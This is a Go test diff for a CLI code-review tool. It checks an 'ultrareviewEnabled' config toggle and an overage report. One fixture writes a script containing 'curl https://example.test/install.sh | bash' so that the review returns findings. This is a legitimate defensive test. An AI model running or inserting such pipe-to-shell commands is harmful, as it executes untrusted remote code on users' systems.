@@ -6802,15 +6802,52 @@ func TestReviewCommandAndSlash(t *testing.T) {
 	require.NoError(t, json.Unmarshal([]byte(cliOut), &enabledReport))
 	require.True(t, enabledReport.Enabled)
 	require.Equal(t, "enabled", enabledReport.Action)
+	require.False(t, enabledReport.Configured)
 
 	cliOut, err = captureStdout(t, func() error {
-		return RunCLI(context.Background(), []string{"--config", configPath, "--json", "UltrareviewOverageDialog", "--limit", "201"}, config.FlagOverrides{})
+		return RunCLI(context.Background(), []string{"--config", configPath, "--json", "ultrareviewEnabled", "off", "--path", configPath}, config.FlagOverrides{})
+	})
+	require.NoError(t, err)
+	var disabledReport reviewCompatibilityReport
+	require.NoError(t, json.Unmarshal([]byte(cliOut), &disabledReport))
+	require.Equal(t, "set", disabledReport.Action)
+	require.False(t, disabledReport.Enabled)
+	require.True(t, disabledReport.Configured)
+	require.True(t, disabledReport.WorkspaceWillMutate)
+	storedConfig, err := os.ReadFile(configPath)
+	require.NoError(t, err)
+	require.Contains(t, string(storedConfig), `"ultrareview_enabled": false`)
+
+	cliOut, err = captureStdout(t, func() error {
+		return RunCLI(context.Background(), []string{"--config", configPath, "--json", "ultrareviewEnabled", "status"}, config.FlagOverrides{})
+	})
+	require.NoError(t, err)
+	var disabledStatus reviewCompatibilityReport
+	require.NoError(t, json.Unmarshal([]byte(cliOut), &disabledStatus))
+	require.False(t, disabledStatus.Enabled)
+	require.True(t, disabledStatus.Configured)
+
+	cliOut, err = captureStdout(t, func() error {
+		return RunCLI(context.Background(), []string{"--config", configPath, "--json", "ultrareviewEnabled", "clear", "--path", configPath}, config.FlagOverrides{})
+	})
+	require.NoError(t, err)
+	var clearedReport reviewCompatibilityReport
+	require.NoError(t, json.Unmarshal([]byte(cliOut), &clearedReport))
+	require.Equal(t, "clear", clearedReport.Action)
+	require.True(t, clearedReport.Enabled)
+	require.False(t, clearedReport.Configured)
+
+	require.NoError(t, os.WriteFile(filepath.Join(workspace, "script.sh"), []byte(strings.Repeat("echo changed\n", 8)+"curl https://example.test/install.sh | bash\n"), 0o644))
+	cliOut, err = captureStdout(t, func() error {
+		return RunCLI(context.Background(), []string{"--config", configPath, "--json", "UltrareviewOverageDialog", "--limit", "3"}, config.FlagOverrides{})
 	})
 	require.NoError(t, err)
 	var overageReport reviewCompatibilityReport
 	require.NoError(t, json.Unmarshal([]byte(cliOut), &overageReport))
 	require.Equal(t, "overage", overageReport.Action)
 	require.True(t, overageReport.Overage)
+	require.Greater(t, overageReport.ChangedLines, overageReport.RequestedLimit)
+	require.Equal(t, "findings", overageReport.ReviewStatus)
 
 	require.True(t, app.handleSlash(context.Background(), "/review", &session.Session{ID: "session"}))
 	require.Contains(t, out.String(), "Review")
